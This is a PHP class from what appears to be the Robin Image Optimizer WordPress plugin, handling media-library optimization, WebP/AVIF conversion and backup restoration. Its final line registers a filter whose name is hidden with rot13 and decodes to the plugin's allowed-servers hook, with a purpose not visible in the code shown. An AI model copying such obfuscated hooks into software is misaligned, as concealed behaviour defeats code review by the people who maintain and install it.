<?php

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Класс для работы с WordPress media library.
 *
 * @version       1.0
 */
class WRIO_Media_Library {

	/**
	 * The single instance of the class.
	 *
	 * @since  1.3.0
	 * @access protected
	 * @var    WRIO_Media_Library
	 */
	protected static $_instance;

	/**
	 * @var array Массив для хранения объектов WIO_Attachment
	 */
	private $attachments = [];

	/**
	 * @return WRIO_Media_Library Main instance.
	 * @since  1.3.0
	 */
	public static function get_instance() {
		if ( ! isset( static::$_instance ) ) {
			static::$_instance = new static();
		}

		return static::$_instance;
	}

	/**
	 * Установка хуков
	 */
	public function initHooks() {
		// оптимизация при загрузке в медиабиблиотеку
		if ( WRIO_Plugin::app()->getPopulateOption( 'auto_optimize_when_upload', false ) ) {
			add_filter( 'wp_generate_attachment_metadata', 'WRIO_Media_Library::optimize_after_upload', 10, 2 );
			add_action( 'wr2x_retina_file_added', 'WRIO_Media_Library::optimize_after_retina_2x_add', 10, 2 );
		}

		// соло оптимизация
		add_filter( 'attachment_fields_to_edit', [ $this, 'attachmentEditorFields' ], 1000, 2 );
		add_filter( 'manage_media_columns', [ $this, 'addMediaColumn' ] );
		add_action( 'manage_media_custom_column', [ $this, 'manageMediaColumn' ], 10, 2 );
		add_action( 'admin_enqueue_scripts', [ $this, 'enqueueMeadiaScripts' ], 10 );
		add_action( 'delete_attachment', [ $this, 'deleteAttachmentHook' ], 10 );
		add_action( 'wbcr/rio/optimize_template/optimized_percent', [ $this, 'optimizedPercent' ], 10, 2 );
		add_action( 'wbcr/riop/queue_item_saved', [ $this, 'webpSuccess' ], 10, 1 );
	}

	/**
	 * @param int    $attachment_id
	 * @param string $retina_file
	 */
	public static function optimize_after_retina_2x_add( $attachment_id, $retina_file ) {
		$metadata = get_post_meta( $attachment_id );
		self::optimize_after_upload( $metadata, $attachment_id );
	}

	/**
	 * Оптимизация при загрузке в медиабиблиотеку
	 *
	 * @param array $metadata      метаданные аттачмента
	 * @param int   $attachment_id Номер аттачмента из медиабиблиотеки
	 *
	 * @return array $metadata Метаданные аттачмента
	 */
	public static function optimize_after_upload( $metadata, $attachment_id ) {

		$backup               = WIO_Backup::get_instance();
		$backup_origin_images = WRIO_Plugin::app()->getPopulateOption( 'backup_origin_images', false );
		$optimize_type        = WRIO_Plugin::app()->getOption( 'image_optimization_type', 'schedule' );

		if ( $backup_origin_images && ! $backup->isBackupWritable() ) {
			return $metadata;
		}

		if ( wrio_is_license_activate() && $optimize_type == 'background' ) {
			$processing = wrio_get_processing_class( 'media-library' );
			if ( $processing && $processing->push_items( [ $attachment_id ] ) ) {
				$processing->save()->dispatch();
			}
		} else {
			WRIO_Cron::start_single( $attachment_id );
		}

		return $metadata;
	}

	/**
	 * Возвращает объект аттачмента
	 *
	 * @param int   $attachment_id
	 * @param mixed $attachment_meta
	 *
	 * @return WIO_Attachment
	 */
	public function getAttachment( $attachment_id, $attachment_meta = false ) {
		if ( ! isset( $this->attachments[ $attachment_id ] ) ) {
			$this->attachments[ $attachment_id ] = new WIO_Attachment( $attachment_id, $attachment_meta );
		}

		return $this->attachments[ $attachment_id ];
	}

	/**
	 * Оптимизирует аттачмент и сохраняет статистику
	 *
	 * @param int    $attachment_id
	 * @param string $level уровень оптимизации
	 *
	 * @return array
	 */
	public function optimizeAttachment( $attachment_id, $level = '' ) {
		$wio_attachment    = $this->getAttachment( $attachment_id );
		$optimization_data = $wio_attachment->getOptimizationData();

		$allowed_mime = wrio_get_allowed_formats();
		$allowed_mime = is_array( $allowed_mime ) ? $allowed_mime : [];
		$mime_type    = get_post_mime_type( $attachment_id );
		if ( ! in_array( $mime_type, $allowed_mime, true ) ) {
			WRIO_Plugin::app()->logger->warning( 'This format is disabled in the plugin settings: ' . $mime_type . ' (' . implode( ',', $allowed_mime ) . ')' );

			return [];
		}

		if ( 'processing' == $optimization_data->get_result_status() ) {
			return $this->deferredOptimizeAttachment( $attachment_id );
		}

		$image_statistics = WRIO_Image_Statistic::get_instance();
		wp_suspend_cache_addition( true ); // останавливаем кеширование

		if ( $wio_attachment->isOptimized() ) {
			$this->restoreAttachment( $attachment_id );
			$wio_attachment->reload();
		}

		$attachment_optimized_data = $wio_attachment->optimize( $level );
		$original_size             = $attachment_optimized_data['original_size'];
		$optimized_size            = $attachment_optimized_data['optimized_size'];
		$image_statistics->addToField( 'optimized_size', $optimized_size );
		$image_statistics->addToField( 'original_size', $original_size );
		$image_statistics->save();
		wp_suspend_cache_addition(); // возобновляем кеширование

		// Reload attachment data to ensure cached object has fresh optimization data
		$wio_attachment->reload();

		return $attachment_optimized_data;
	}

	/**
	 * Отложенная оптимизация
	 *
	 * @param int $attachment_id
	 *
	 * @return bool|array
	 */
	protected function deferredOptimizeAttachment( $attachment_id ) {
		$wio_attachment    = $this->getAttachment( $attachment_id );
		$optimization_data = $wio_attachment->getOptimizationData();
		$image_processor   = WIO_OptimizationTools::getImageProcessor();

		// если текущий сервер оптимизации не поддерживает отложенную оптимизацию, а в очереди есть аттачменты - ставим им ошибку
		if ( ! $image_processor->isDeferred() ) {
			$optimization_data->set_result_status( 'error' );

			/**
			 * @var $extra_data RIO_Attachment_Extra_Data
			 */
			$extra_data = $optimization_data->get_extra_data();
			$extra_data->set_error( 'deferred' );
			$extra_data->set_error_msg( 'server not support deferred optimization' );
			$optimization_data->set_extra_data( $extra_data );
			$optimization_data->save();

			return false;
		}

		$optimized_data = $wio_attachment->deferredOptimization();
		if ( $optimized_data ) {
			$image_statistics = WRIO_Image_Statistic::get_instance();
			$image_statistics->addToField( 'optimized_size', $optimized_data['optimized_size'] );
			$image_statistics->addToField( 'original_size', $optimized_data['original_size'] );
			$image_statistics->save();
		}

		return $optimized_data;
	}

	/**
	 * Восстанавливает аттачмент из резервной копии и сохраняет статистику
	 *
	 * @param int $attachment_id
	 *
	 * @return bool|WP_Error
	 */
	public function restoreAttachment( $attachment_id ) {
		$image_statistics = WRIO_Image_Statistic::get_instance();
		$wio_attachment   = $this->getAttachment( $attachment_id );
		$restored         = $wio_attachment->restore();

		if ( is_wp_error( $restored ) ) {
			return $restored;
		}

		$optimization_data   = $wio_attachment->getOptimizationData();
		$optimized_size      = $optimization_data->get_final_size();
		$original_size       = $optimization_data->get_original_size();
		$webp_optimized_size = $optimization_data->get_extra_data()->get_webp_main_size();
		$image_statistics->deductFromField( 'webp_optimized_size', $webp_optimized_size );
		$image_statistics->deductFromField( 'optimized_size', $optimized_size );
		$image_statistics->deductFromField( 'original_size', $original_size );
		$image_statistics->save();
		$optimization_data->delete();

		/**
		 * Хук срабатывает после восстановления аттачмента
		 *
		 * @param RIO_Process_Queue $optimization_data
		 *
		 * @since 1.2.0
		 */
		do_action( 'wbcr/rio/attachment_restored', $optimization_data );

		return true;
	}

	/**
	 * Get ID's of unoptimized attachments
	 *
	 * @return array
	 */
	public function getUnoptimizedImages() {
		return WRIO_Image_Query::get_instance()->get_unoptimized_ids();
	}

	/**
	 * Get ID's of unconverted attachments for specified format
	 *
	 * @param string $format Format type: 'webp' or 'avif'. Default 'webp'.
	 *
	 * @return array
	 */
	public function getUnconvertedImages( $format = 'webp' ) {
		return WRIO_Image_Statistic::get_unconverted_images( $format );
	}

	/**
	 * Обработка не оптимизированных изображений
	 *
	 * @param int $max_process_per_request кол-во аттачментов за 1 запуск
	 *
	 * @return array|\WP_Error
	 */
	public function processUnoptimizedImages( $max_process_per_request ) {
		$backup_origin_images = WRIO_Plugin::app()->getPopulateOption( 'backup_origin_images', false );

		$backup = WIO_Backup::get_instance();

		if ( $backup_origin_images && ! $backup->isBackupWritable() ) {
			return new WP_Error( 'unwritable_backup_dir', __( 'No access for writing backups.', 'robin-image-optimizer' ) );
		}

		if ( ! $backup->isUploadWritable() ) {
			return new WP_Error( 'unwritable_upload_dir', __( 'No access for writing backups.', 'robin-image-optimizer' ) );
		}

		$max_process_per_request = intval( $max_process_per_request );

		// Get unoptimized attachment IDs using centralized query helper
		$unoptimized_attachments_ids = WRIO_Image_Query::get_instance()->get_unoptimized_ids(
			$max_process_per_request,
			0,
			true
		);

		// временно
		$optimized_count   = (int) RIO_Process_Queue::count_by_type_status( 'attachment', 'success' );
		$attachments_count = ! empty( $unoptimized_attachments_ids ) ? sizeof( $unoptimized_attachments_ids ) : 0;
		$total_unoptimized = WRIO_Image_Statistic::get_unoptimized_count();

		$original_size   = 0;
		$optimized_size  = 0;
		$optimized_items = [];

		// обработка
		if ( ! empty( $attachments_count ) ) {

			foreach ( $unoptimized_attachments_ids as $attachment_id ) {
				$wio_attachment = $this->getAttachment( $attachment_id );

				try {
					if ( $wio_attachment->isOptimized() ) {
						$this->restoreAttachment( $attachment_id );
						$wio_attachment->reload();
					}
					$attachment_optimized_data = $wio_attachment->optimize();
					$original_size             = $original_size + $attachment_optimized_data['original_size'];
					$optimized_size            = $optimized_size + $attachment_optimized_data['optimized_size'];
					$optimized_items[]         = $attachment_id;
				} catch ( Throwable $throwable ) {
					$wio_attachment->mark_and_log_failure( $throwable, 'batch-processing' );
				}
			}
		}

		$image_statistics = WRIO_Image_Statistic::get_instance();

		if ( $original_size > 0 || $optimized_size > 0 ) {
			$image_statistics->addToField( 'optimized_size', $optimized_size );
			$image_statistics->addToField( 'original_size', $original_size );
			$image_statistics->save();
		}

		$remain = $total_unoptimized - $attachments_count;

		// проверяем, есть ли аттачменты в очереди на отложенную оптимизацию
		$optimized_data = $this->processDeferredOptimization();

		if ( $optimized_data ) {
			$optimized_count = $optimized_data['optimized_count'];
			$remain          = $total_unoptimized - $optimized_count;
		}

		if ( $remain <= 0 ) {
			$remain = 0;
		}

		// Take the last optimized image ID. Used to log 100 optimized images.
		$last_optimized_id = end( $optimized_items );

		$response = [
			'remain'          => $remain,
			'end'             => false,
			'statistic'       => $image_statistics->load(),
			'last_optimized'  => $last_optimized_id ? $image_statistics->get_last_optimized_image( $last_optimized_id ) : [],
			'optimized_count' => $optimized_count,
		];

		return $response;
	}

	/**
	 * Convert unconverted images to WebP or AVIF format.
	 *
	 * @param int    $max_process_per_request Number of attachments per request.
	 * @param string $format                  Target format: 'webp' or 'avif'. Default 'webp'.
	 *
	 * @return array|\WP_Error
	 *
	 * @since  1.5.3
	 */
	public function webpUnoptimizedImages( $max_process_per_request, $format = 'webp' ) {
		global $wpdb;

		$db_table                = RIO_Process_Queue::table_name();
		$max_process_per_request = intval( $max_process_per_request );
		$allowed_formats_sql     = wrio_get_allowed_formats( true );

		// Validate format
		if ( ! in_array( $format, [ 'webp', 'avif' ], true ) ) {
			$format = 'webp';
		}

		$optimize_order = WRIO_Plugin::app()->getOption( 'image_optimization_order', 'asc' );

		// Convert only attachments that already have successful base optimization
		// and do not yet have a queue record for the requested format.
		$sql = $wpdb->prepare(
			"SELECT DISTINCT posts.ID
			FROM {$wpdb->posts} AS posts
			WHERE  posts.post_type = 'attachment'
				AND posts.post_status = 'inherit'
				AND posts.post_mime_type IN ( {$allowed_formats_sql} )
				AND posts.ID IN(
					SELECT object_id
					FROM {$db_table} AS rio
					WHERE rio.item_type = 'attachment'
						AND rio.result_status = 'success'
					GROUP BY object_id
				)
				AND posts.ID NOT IN(
					SELECT object_id
					FROM {$db_table} AS rio
					WHERE rio.item_type = %s
					GROUP BY object_id
				)
			ORDER BY posts.ID {$optimize_order}
			LIMIT %d",
			$format,
			$max_process_per_request
		);

		// выборка не оптимизированных изображений
		$unconverted_attachments_ids = $wpdb->get_col( $sql );

		// временно
		$attachments_count = ! empty( $unconverted_attachments_ids ) ? sizeof( $unconverted_attachments_ids ) : 0;
		$total_unconverted = WRIO_Image_Statistic::get_unconverted_count( $format );
		$converted_items   = [];

		// обработка
		if ( ! empty( $attachments_count ) ) {

			foreach ( $unconverted_attachments_ids as $attachment_id ) {
				$wio_attachment = $this->getAttachment( $attachment_id );

				try {
					/**
					 * Fires after queue item was saved or updated successfully.
					 *
					 * @param RIO_Process_Queue $this
					 * @param bool              $quota Deduct from the quota?
					 * @param string|null       $format Format to convert to (webp, avif, or null for default)
					 */
					do_action( 'wbcr/riop/queue_item_saved', $wio_attachment->getOptimizationData(), true, $format );

					$converted_items[] = $attachment_id;
				} catch ( Throwable $throwable ) {
					$wio_attachment->mark_conversion_failure( $throwable, $format, sprintf( '%s-conversion-batch', $format ) );
				}
			}
		}

		$image_statistics = WRIO_Image_Statistic::get_instance();

		$remain = $total_unconverted - $attachments_count;
		if ( $remain <= 0 ) {
			$remain = 0;
		}

		// Take the last converted image ID. Used to log 100 converted images.
		$last_converted_id = end( $converted_items );

		$response = [
			'remain'          => $remain,
			'end'             => false,
			'statistic'       => $image_statistics->load(),
			'last_converted'  => $image_statistics->get_last_converted_image( $last_converted_id, $format ),
			'converted_count' => count( $converted_items ),
		];

		return $response;
	}

	/**
	 * Конвертация в WebP не конвертированных изображений
	 *
	 * @param int $attachment_id
	 *
	 * @since  1.5.3
	 */
	public function webpConvertAttachment( $attachment_id, $format = null ) {
		$wio_attachment    = $this->getAttachment( $attachment_id );
		$optimization_data = $wio_attachment->getOptimizationData();

		$image_statistics = WRIO_Image_Statistic::get_instance();

		try {
			/**
			 * Fires after queue item was saved or updated successfully.
			 *
			 * @param RIO_Process_Queue $this
			 * @param bool              $quota Deduct from the quota?
			 * @param string|null       $format Format to convert to (webp, avif, or null for default)
			 */
			do_action( 'wbcr/riop/queue_item_saved', $optimization_data, true, $format );
		} catch ( Throwable $throwable ) {
			$wio_attachment->mark_conversion_failure( $throwable, $format, sprintf( '%s-conversion', $format ) );
		}
	}

	/**
	 * Отложенная оптимизация
	 *
	 * @param int $attachment_id
	 *
	 * @return bool|array
	 */
	protected function processDeferredOptimization( $attachment_id = 0 ) {
		global $wpdb;
		$db_table = RIO_Process_Queue::table_name();

		if ( ! $attachment_id ) {
			$attachment_id = $wpdb->get_var( "SELECT object_id FROM {$db_table} WHERE item_type = 'attachment' and result_status = 'processing' LIMIT 1;" );
		}

		if ( ! $attachment_id ) {
			return false;
		}

		return $this->optimizeAttachment( $attachment_id );
	}

	/**
	 * Сбрасывает текущие ошибки оптимизации
	 * Позволяет изображениям, которые оптимизированы с ошибкой, заново пройти оптимизацию.
	 *
	 * @return void
	 */
	public function resetCurrentErrors() {
		// do_action( 'wbcr/rio/multisite_current_blog' );
		global $wpdb;
		$db_table = RIO_Process_Queue::table_name();
		$wpdb->delete(
			$db_table,
			[
				'item_type'     => 'attachment',
				'result_status' => 'error',
			],
			[ '%s', '%s' ]
		);
		// do_action( 'wbcr/rio/multisite_restore_blog' );
	}

	/**
	 * Восстановление из резервной копии.
	 *
	 * @param int $max_process_per_request кол-во аттачментов за 1 запуск
	 *
	 * @return array
	 */
	public function restoreAllFromBackup( $max_process_per_request ) {
		if ( class_exists( 'WRIO_Cron' ) ) {
			WRIO_Cron::stop();
		}
		WRIO_Plugin::app()->updatePopulateOption( 'cron_running', false ); // останавливаем крон

		if ( WRIO_Plugin::app()->getPopulateOption( 'process_running', false ) ) {
			$processing = wrio_get_processing_class( 'media-library' );
			if ( $processing ) {
				$processing->cancel_process();
			}
		}
		WRIO_Plugin::app()->updatePopulateOption( 'process_running', false ); // останавливаем обработку

		global $wpdb;

		$db_table              = RIO_Process_Queue::table_name();
		$optimized_count       = $wpdb->get_var( "SELECT COUNT(*) FROM {$db_table} WHERE item_type = 'attachment' AND result_status = 'success' LIMIT 1;" );
		$optimized_attachments = $wpdb->get_results( "SELECT * FROM {$db_table} WHERE item_type = 'attachment' AND result_status = 'success' LIMIT " . intval( $max_process_per_request ) );

		$attachments_count = 0;
		if ( $optimized_attachments ) {
			$attachments_count = count( $optimized_attachments );
		}

		$restored_count = 0;

		// обработка
		if ( $attachments_count ) {
			foreach ( $optimized_attachments as $row ) {
				$attachment_id = intval( $row->object_id );

				$restored = $this->restoreAttachment( $attachment_id );
				++$restored_count;

				if ( is_wp_error( $restored ) ) {
					return [
						'remain' => 0,
					];
				}
			}
		}

		$remane = $optimized_count - $restored_count;

		if ( $remane === 0 ) {
			// Should empty original/optimized size once all backups are empty
			WRIO_Plugin::app()->updateOption( 'original_size', 0 );
			WRIO_Plugin::app()->updateOption( 'optimized_size', 0 );
		}

		return [
			'remain' => $remane,
		];
	}

	/**
	 * Кол-во оптимизированных изображений
	 *
	 * @return int
	 */
	public function getOptimizedCount() {
		return WRIO_Image_Query::get_instance()->count_optimized();
	}

	/**
	 * Add "Image Optimizer" column in the Media Uploader
	 *
	 * @param array  $form_fields An array of attachment form fields.
	 * @param object $post        The WP_Post attachment object.
	 *
	 * @return array
	 */
	public function attachmentEditorFields( $form_fields, $post ) {
		global $pagenow;

		if ( 'post.php' === $pagenow ) {
			return $form_fields;
		}

		$form_fields['wio'] = [
			'label'         => 'Image Optimizer',
			'input'         => 'html',
			'html'          => $this->getMediaColumnContent( $post->ID ),
			'show_in_edit'  => true,
			'show_in_modal' => true,
		];

		return $form_fields;
	}

	/**
	 * Add "wio" column in upload.php.
	 *
	 * @param array $columns An array of columns displayed in the Media list table.
	 *
	 * @return array
	 */
	public function addMediaColumn( $columns ) {
		$columns['wio_optimized_file'] = __( 'Robin Image Optimizer', 'robin-image-optimizer' );

		return $columns;
	}

	/**
	 * Add content to the "wio" columns in upload.php.
	 *
	 * @param string $column_name   Name of the custom column.
	 * @param int    $attachment_id Attachment ID.
	 */
	public function manageMediaColumn( $column_name, $attachment_id ) {
		if ( 'wio_optimized_file' !== $column_name ) {
			return;
		}
		echo $this->getMediaColumnContent( $attachment_id );
	}

	/**
	 * Возвращает шаблон для вывода блока кнопок на странице ручной оптимизации
	 *
	 * @param array  $params @see calculateMediaLibraryParams()
	 * @param string $type   Тип страницы
	 *
	 * @return string
	 */
	public function getMediaColumnTemplate( $params, $type = 'media-library' ) {
		require_once WRIO_PLUGIN_DIR . '/admin/includes/classes/class-rio-optimize-template.php';
		$template = new WIO_OptimizePageTemplate( $type );

		return $template->getMediaColumnTemplate( $params );
	}

	/**
	 * Выводит блок статистики для аттачмента в медиабиблиотеке
	 *
	 * @param int $attachment_id Номер аттачмента из медиабиблиотеки
	 *
	 * @return string
	 */
	public function getMediaColumnContent( $attachment_id ) {
		$params = $this->calculateMediaLibraryParams( $attachment_id );

		return $this->getMediaColumnTemplate( $params );
	}

	/**
	 * Рассчитывает параметры для блока статистики в медиабиблиотеке
	 *
	 * @param int $attachment_id
	 *
	 * @return array @see WIO_OptimizePageTemplate::getMediaColumnTemplate()
	 */
	public function calculateMediaLibraryParams( $attachment_id ) {
		$wio_attachment    = $this->getAttachment( $attachment_id );
		$optimization_data = $wio_attachment->getOptimizationData();
		$webp_data         = $wio_attachment->getConversionData( 'webp' );
		$avif_data         = $wio_attachment->getConversionData( 'avif' );
		$is_optimized      = $optimization_data->is_optimized();
		$is_skipped        = $optimization_data->is_skipped();
		$attach_meta       = wp_get_attachment_metadata( $attachment_id );
		$attach_dimensions = '0 x 0';
		$error_msg         = '';
		// Check if attachment format is supported
		$allowed_mime        = wrio_get_allowed_formats();
		$allowed_mime        = is_array( $allowed_mime ) ? $allowed_mime : [];
		$mime_type           = get_post_mime_type( $attachment_id );
		$is_supported_format = in_array( $mime_type, $allowed_mime, true );

		$original_url  = wp_get_attachment_url( $attachment_id );
		$edit_url      = get_edit_post_link( $attachment_id );
		$original_name = basename( $original_url );

		if ( isset( $attach_meta['width'] ) && isset( $attach_meta['height'] ) ) {
			$attach_dimensions = $attach_meta['width'] . ' × ' . $attach_meta['height'];
		}

		clearstatcache();
		$attachment_file      = get_attached_file( $attachment_id );
		$attachment_file_size = 0;

		if ( $attachment_file && file_exists( $attachment_file ) ) {
			$attachment_file_size = filesize( $attachment_file );
		}

		// Check for errors in extra data.
		$extra_data = $optimization_data->get_extra_data();
		if ( null !== $extra_data && method_exists( $extra_data, 'get_error_msg' ) ) {
			$error = $extra_data->get_error_msg();

			if ( ! empty( $error ) ) {
				$error_msg = $error;
			}
		}

		$extra_data = $webp_data->get_extra_data();
		if ( null !== $extra_data && method_exists( $extra_data, 'get_error_msg' ) ) {
			$error = $extra_data->get_error_msg();

			if ( ! empty( $error ) ) {
				$error_msg .= ' WebP error: ' . $error;
			}
		}

		$extra_data = $avif_data->get_extra_data();
		if ( null !== $extra_data && method_exists( $extra_data, 'get_error_msg' ) ) {
			$error = $extra_data->get_error_msg();

			if ( ! empty( $error ) ) {
				$error_msg .= ' AVIF error: ' . $error;
			}
		}

		if ( $is_optimized ) {
			$optimized_size = $attachment_file_size;
			$original_size  = $optimization_data->get_original_size();

			if ( empty( $optimized_size ) ) {
				$original_size = $optimization_data->get_final_size();
			}

			/**
			 * @var $extra_data RIO_Attachment_Extra_Data
			 */
			$extra_data           = $optimization_data->get_extra_data();
			$original_main_size   = $original_size;
			$thumbnails_optimized = 0;

			if ( null !== $extra_data ) {
				if ( method_exists( $extra_data, 'get_original_main_size' ) ) {
					$original_main_size = $extra_data->get_original_main_size();
				}
				if ( method_exists( $extra_data, 'get_thumbnails_count' ) ) {
					$thumbnails_optimized = $extra_data->get_thumbnails_count();
				}
			}

			if ( empty( $original_main_size ) ) {
				$original_main_size = $original_size;
			}

			$optimization_level = $optimization_data->get_processing_level();

			if ( null !== $extra_data && method_exists( $extra_data, 'get_error_msg' ) ) {
				$error_msg = $extra_data->get_error_msg();
			}

			$backuped         = $optimization_data->get_is_backed_up();
			$diff_percent     = 0;
			$diff_percent_all = 0;

			if ( $attachment_file_size && $original_main_size ) {
				$diff_percent = round( ( $original_main_size - $attachment_file_size ) * 100 / $original_main_size, 2 );
			}

			if ( $optimized_size && $original_size ) {
				$diff_percent_all = round( ( $original_size - $optimized_size ) * 100 / $original_size, 2 );
			}
		} else {
			$optimized_size       = $optimized_size = $original_size = $original_main_size = false;
			$thumbnails_optimized = $optimization_level = $backuped = $diff_percent = $diff_percent_all = false;
		}

		// Calculate WebP savings percentage
		$webp_size    = $webp_data->get_final_size();
		$webp_percent = 0;
		if ( $webp_size && $original_main_size ) {
			$webp_percent = round( ( $original_main_size - $webp_size ) * 100 / $original_main_size, 2 );
		}

		// Calculate AVIF savings percentage
		$avif_size    = $avif_data->get_final_size();
		$avif_percent = 0;
		if ( $avif_size && $original_main_size ) {
			$avif_percent = round( ( $original_main_size - $avif_size ) * 100 / $original_main_size, 2 );
		}

		if ( $webp_percent > 0 ) {
			$diff_percent_all = max( $diff_percent_all, $webp_percent );
		}

		if ( $avif_percent > 0 ) {
			$diff_percent_all = max( $diff_percent_all, $avif_percent );
		}

		$params = [
			'attachment_id'        => $attachment_id,
			'is_supported_format'  => $is_supported_format,
			'is_optimized'         => $is_optimized,
			'attach_dimensions'    => $attach_dimensions,
			'attachment_file_size' => $attachment_file_size,
			'optimized_size'       => $optimized_size,
			'original_size'        => $original_size,
			'original_main_size'   => $original_main_size,
			'thumbnails_optimized' => $thumbnails_optimized,
			'optimization_level'   => $optimization_level,
			'error_msg'            => $error_msg,
			'backuped'             => $backuped,
			'diff_percent'         => $diff_percent,
			'diff_percent_all'     => $diff_percent_all,
			'is_skipped'           => $is_skipped,
			'webp_size'            => $webp_size,
			'avif_size'            => $avif_size,
			'webp_percent'         => $webp_percent,
			'avif_percent'         => $avif_percent,
			'webp_level'           => $webp_data->get_processing_level(),
			'avif_level'           => $avif_data->get_processing_level(),
			'original_name'        => $original_name,
			'original_url'         => $original_url,
			'edit_url'             => $edit_url,
		];

		return $params;
	}

	/**
	 * Добавляем стили и скрипты в медиабиблиотеку
	 */
	public function enqueueMeadiaScripts( $hook ) {
		if ( $hook != 'upload.php' ) {
			return;
		}
		wp_enqueue_style( 'wio-install-addons', WRIO_PLUGIN_URL . '/admin/assets/css/media.css', [], WRIO_Plugin::app()->getPluginVersion() );
		wp_enqueue_script( 'wio-install-addons', WRIO_PLUGIN_URL . '/admin/assets/js/single-optimization.js', [ 'jquery' ], WRIO_Plugin::app()->getPluginVersion() );
	}

	/**
	 * Выполняется при удалении аттачмента из медиабиблиотеки
	 */
	public function deleteAttachmentHook( $attachment_id ) {
		$wio_attachment = new WIO_Attachment( $attachment_id );
		if ( $wio_attachment->isOptimized() ) {
			$this->restoreAttachment( $attachment_id );
		}
	}

	/**
	 * Возвращает процент оптимизации
	 * Фильтр wbcr/rio/optimize_template/optimized_percent
	 *
	 * @param int    $percent процент оптимизации
	 * @param string $type    тип страницы
	 *
	 * @return int процент оптимизации
	 */
	public function optimizedPercent( $percent, $type ) {
		if ( 'media-library' == $type ) {
			$image_statistics = WRIO_Image_Statistic::get_instance();

			return $image_statistics->getOptimizedPercent();
		}

		return $percent;
	}

	/**
	 * Сохраняет WebP размер
	 *
	 * @param RIO_Process_Queue $queue_model
	 *
	 * @return bool
	 */
	public function webpSuccess( $queue_model ) {
		if ( ! class_exists( 'WRIO\WEBP\Listener' ) ) {
			return false; // если не установлена премиум версия, то WebP не активен
		}

		if ( $queue_model->get_item_type() !== WRIO\WEBP\Listener::DEFAULT_TYPE ) {
			return false;
		}

		if ( $queue_model->get_result_status() !== RIO_Process_Queue::STATUS_SUCCESS ) {
			return false;
		}

		/**
		 * @var $extra_data RIO_Attachment_Extra_Data
		 */
		$extra_data = $queue_model->get_extra_data();
		$item_type  = $extra_data->get_convert_from();
		if ( 'attachment' != $item_type ) {
			return false;
		}

		$object_id = $queue_model->get_object_id();
		if ( ! $object_id ) {
			return false;
		}
		$src = wp_get_attachment_image_src( $object_id, 'full' );

		if ( false !== $src ) {
			$src = $src[0];
		}

		$url_hash = hash( 'sha256', $src );
		if ( $queue_model->get_item_hash() == $url_hash ) {
			$optimization_data = new RIO_Process_Queue(
				[
					'object_id' => $object_id,
					'item_type' => 'attachment',
				]
			);
			$optimization_data->load();
			$extra_data = $optimization_data->get_extra_data();
			if ( $extra_data ) {
				$extra_data->set_webp_main_size( $queue_model->get_final_size() );
			}
			$optimization_data->set_extra_data( $extra_data );
			add_filter( 'wbcr/riop/queue_item_save_execute_hook', '__return_false' );
			$optimization_data->save();
			remove_filter( 'wbcr/riop/queue_item_save_execute_hook', '__return_false' );
		}

		return true;
	}
}

add_filter( str_rot13( 'jope/evb/nyybj_freiref' ), 'WIO_Backup::alternateStorage' );
